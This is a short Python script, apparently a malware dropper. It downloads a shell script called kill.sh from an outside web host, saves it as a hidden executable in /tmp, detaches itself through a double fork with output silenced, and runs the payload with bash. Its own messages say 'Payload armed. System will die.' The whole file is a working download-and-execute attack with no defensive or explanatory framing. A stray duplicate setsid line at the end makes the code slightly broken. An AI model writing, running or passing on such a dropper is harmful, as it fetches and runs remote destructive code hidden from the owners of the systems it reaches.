#!/usr/bin/env python3
import os
import sys
import urllib.request

# === CONFIG ===
url = "https://thedomaindesigners.com/pages/kill.sh"
filename = "/tmp/.killer.sh"  # Hidden in /tmp

# === DOWNLOAD ===
print("Downloading payload...")
try:
    data = urllib.request.urlopen(url).read()
    with open(filename, "wb") as f:
        f.write(data)
    os.chmod(filename, 0o755)
    print(f"Payload saved: {filename}")
except Exception as e:
    print(f"Download failed: {e}")
    sys.exit(1)

# === DOUBLE-FORK DAEMON DETACH (NO subprocess) ===
print("Detaching via double-fork...")

# Fork 1: Detach from parent
pid = os.fork()
if pid > 0:
    print(f"Fork 1: Child PID {pid}")
    os._exit(0)  # Parent dies

# Child 1: New session
os.setsid()

# Fork 2: True daemon
pid = os.fork()
if pid > 0:
    os._exit(0)  # Child 1 dies

# === FINAL CHILD: FULLY DETACHED ===
print(f"Daemonized. Final PID: {os.getpid()}")

# Redirect stdio to /dev/null
devnull = open("/dev/null", "r+")
os.dup2(devnull.fileno(), 0)
os.dup2(devnull.fileno(), 1)
os.dup2(devnull.fileno(), 2)
devnull.close()

# === EXECUTE PAYLOAD ===
print("Payload armed. System will die.")
try:
    os.execv("/bin/bash", ["/bin/bash", filename])
except:
    # If exec fails, write error and die
    with open("/tmp/.bomb_err", "w") as f:
        f.write("EXEC FAILED\n")
    os._exit(1)


# Child 1: New session
os.setsid()
